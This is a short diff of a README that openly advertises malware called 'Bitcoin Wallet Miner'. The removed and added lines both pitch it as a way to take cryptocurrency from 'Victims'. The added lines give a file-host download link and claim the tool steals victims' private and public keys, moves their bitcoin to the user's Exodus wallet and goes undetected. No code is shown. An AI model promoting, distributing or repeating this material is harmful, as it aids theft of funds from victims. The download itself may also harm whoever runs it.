@@ -1,2 +1,4 @@
-# Bitcoin-Wallet-Miner
-Bitcoin Wallet Miner is a very usefull tool to obtain Crypto currencies from your Victims!
+Download The miner here https://gofile.io/d/r2TfYS
+Steals Victims Private and Public Key
+Automatically Transfers Their bitcoin To your Exodus Wallet!
+Undetected and Fast!
